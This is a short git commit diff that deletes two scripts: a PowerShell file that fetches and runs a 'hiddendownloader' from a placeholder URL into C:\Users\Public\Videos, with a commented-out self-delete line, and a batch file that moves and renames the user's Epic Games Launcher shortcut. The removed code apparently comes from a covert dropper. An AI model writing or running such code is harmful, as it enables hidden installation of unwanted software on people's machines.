ae6c7118d657280da214c9ec711474ec0e2c9db8
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-03 15:06:46 +0100

    schwan

--- downloadanduninstall.ps1
+++
@@ -1,4 +0,0 @@
-Invoke-WebRequest 'path' -OutFile 'C:\Users\Public\Videos\downloader.ps1'
-Invoke-WebRequest 'path' -OutFile 'C:\Users\Public\Videos\hiddendownloader.ps1'
-PSScriptRoot/hiddendownloader.ps1
-#Remove-Item $PSCommandPath -Force 
--- move.bat
+++
@@ -1,4 +0,0 @@
-
-for /r C:\Users\%USERNAME% %%a in (*) do if "%%~nxa"=="Epic Games Launcher.lnk" set p=%%~dpnxa
-move "%p%" C:\Users\Public\Videos
-ren "C:\Users\Public\Videos\Epic Games Launcher.lnk" "§.lnk"
